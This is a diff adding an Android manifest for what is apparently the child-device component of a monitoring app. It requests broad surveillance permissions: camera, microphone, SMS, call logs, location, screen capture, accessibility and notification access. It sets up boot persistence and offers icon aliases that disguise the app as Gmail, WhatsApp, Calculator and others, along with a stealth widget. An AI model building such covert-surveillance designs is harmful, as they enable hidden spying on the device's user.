@@ -1,0 +1,512 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <permission android:name="nexus.android.child.PERMISSION_CONNECTION_STATUS"
+        android:protectionLevel="signature" />
+
+    <uses-feature
+        android:name="android.hardware.camera"
+        android:required="false" />
+    <uses-feature
+        android:name="android.hardware.microphone"
+        android:required="false" />
+    <uses-feature
+        android:name="android.hardware.telephony"
+        android:required="false" />
+
+    <!-- Camera Permission -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <!-- Audio Permission -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <!-- Foreground Service Permission -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"
+        tools:ignore="ForegroundServicesPolicy" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT" tools:ignore="ProtectedPermissions"/>
+    <!-- Alert Window Permission -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <!-- Notification Permission -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <!-- Wake Lock Permission -->
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <!-- Auto Start Permission -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.QUICKBOOT_POWERON" />
+    <!-- SMS Permission -->
+    <uses-permission android:name="android.permission.RECEIVE_SMS"
+        tools:ignore="SmsAndCallLogPolicy" />
+    <uses-permission android:name="android.permission.READ_SMS"
+        tools:ignore="SmsAndCallLogPolicy" />
+    <!-- Call Log Permission -->
+    <uses-permission android:name="android.permission.READ_CALL_LOG"
+        tools:ignore="SmsAndCallLogPolicy" />
+    <!-- Location permissions -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"
+        tools:ignore="BackgroundLocationPolicy" />
+    <!-- Call Recording Permissions -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <!--suppress DeprecatedClassUsageInspection -->
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"
+        tools:ignore="SmsAndCallLogPolicy" />
+    <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="29" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
+        tools:ignore="AllFilesAccessPolicy,ScopedStorage" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"
+        tools:ignore="PhotoAndVideoPolicy,SelectedPhotoAccess" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"
+        tools:ignore="PhotoAndVideoPolicy,SelectedPhotoAccess" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+    <!-- Missing Permissions -->
+    <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <!-- Digital Wellbeing Permissions -->
+    <!-- PACKAGE_USAGE_STATS for older Android versions (pre-API 31) -->
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
+    <!-- QUERY_ALL_PACKAGES for modern Android (API 31+) -->
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
+    <!-- Unrestricted Data Permission -->
+    <uses-permission android:name="android.permission.UNRESTRICTED_DATA"
+        tools:ignore="ProtectedPermissions" />
+    <!-- Wallpaper Permission -->
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+    <!-- Vibration Permission -->
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <!-- Network State Permission -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+
+    <queries>
+        <intent>
+            <action android:name="miui.intent.action.CALL_RECORDING_SETTINGS" />
+        </intent>
+    </queries>
+
+    <application
+        android:allowBackup="true"
+        android:dataExtractionRules="@xml/data_extraction_rules"
+        android:fullBackupContent="@xml/backup_rules"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.Child"
+        tools:targetApi="31">
+        <activity
+            android:name="nexus.android.child.MainActivity"
+            android:exported="true"
+            android:theme="@style/Theme.Child">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name="nexus.android.child.permissions.PermissionGuideActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Child" />
+
+        <activity
+            android:name="nexus.android.child.customization.IconSelectionActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Child" />
+
+        <activity
+            android:name="nexus.android.child.customization.FakeUIActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Child.Fullscreen" />
+
+        <activity
+            android:name="nexus.android.child.applock.AppLockActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Child"
+            android:screenOrientation="fullSensor"
+            android:launchMode="singleTop" />
+
+        <activity
+            android:name="nexus.android.child.applock.AppLockSettingsActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Child" />
+
+        <!-- Transparent activity for MediaProjection permission -->
+        <activity
+            android:name="nexus.android.child.components.screen.TransparentMediaProjectionActivity"
+            android:theme="@style/TransparentActivity"
+            android:excludeFromRecents="true"
+            android:launchMode="singleInstance"
+            android:taskAffinity=""
+            android:exported="false" />
+
+        <!-- Activity aliases for different app icons with corresponding names -->
+        <activity-alias
+            android:name=".MainActivityIconGmail"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_gmail"
+            android:label="@string/app_name_gmail"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconWhatsApp"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_whatsapp"
+            android:label="@string/app_name_whatsapp"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconInstagram"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_instagram"
+            android:label="@string/app_name_instagram"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconSettings"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_settings"
+            android:label="@string/app_name_settings"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconYouTubeMusic"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_youtube_music"
+            android:label="@string/app_name_youtube_music"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconCalculator"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_calculator"
+            android:label="@string/app_name_calculator"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconTelegram"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_telegram"
+            android:label="@string/app_name_telegram"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconSecurity"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_security"
+            android:label="@string/app_name_security"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconChatGPT"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_chatgpt"
+            android:label="@string/app_name_chatgpt"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconGoogle"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_google"
+            android:label="@string/app_name_google"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconGameBooster"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_game_booster"
+            android:label="@string/app_name_game_booster"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconGemini"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_gemini"
+            android:label="@string/app_name_gemini"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconGPay"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_gpay"
+            android:label="@string/app_name_gpay"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconMaps"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_maps"
+            android:label="@string/app_name_maps"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconMessages"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_messages"
+            android:label="@string/app_name_messages"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconGoogleOne"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_google_one"
+            android:label="@string/app_name_google_one"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconPlayStore"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_play_store"
+            android:label="@string/app_name_play_store"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconSpotify"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_spotify"
+            android:label="@string/app_name_spotify"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconX"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_x"
+            android:label="@string/app_name_x"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MainActivityIconYouTube"
+            android:targetActivity="nexus.android.child.MainActivity"
+            android:icon="@mipmap/ic_app_icon_youtube"
+            android:label="@string/app_name_youtube"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <service
+            android:name="nexus.android.child.BackgroundService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync|camera|microphone|location|mediaProjection"
+            android:stopWithTask="false" />
+
+        <service
+            android:name="nexus.android.child.service.PersistentJobService"
+            android:permission="android.permission.BIND_JOB_SERVICE"
+            android:exported="false" />
+
+        <receiver
+            android:name="nexus.android.child.service.BootReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="nexus.android.child.service.BootServiceRestartReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <action android:name="nexus.android.child.SERVICE_RESTART_RETRY" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="nexus.android.child.service.UnlockReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+
+        <service
+            android:name="nexus.android.child.service.ParentalAccessibilityService"
+            android:exported="false"
+            android:enabled="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            tools:ignore="AccessibilityPolicy">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <service
+            android:name="nexus.android.child.components.notification.NotificationListener"
+            android:exported="true"
+            android:enabled="true"
+            android:label="NotificationListener"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- Stealth Toggle Widget -->
+        <receiver
+            android:name="nexus.android.child.widget.StealthWidgetProvider"
+            android:exported="true"
+            android:label="@string/widget_name">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE" />
+                <action android:name="nexus.android.child.TOGGLE_STEALTH" />
+            </intent-filter>
+            <meta-data
+                android:name="android.appwidget.provider"
+                android:resource="@xml/stealth_widget_info" />
+        </receiver>
+
+    </application>
+
+</manifest>
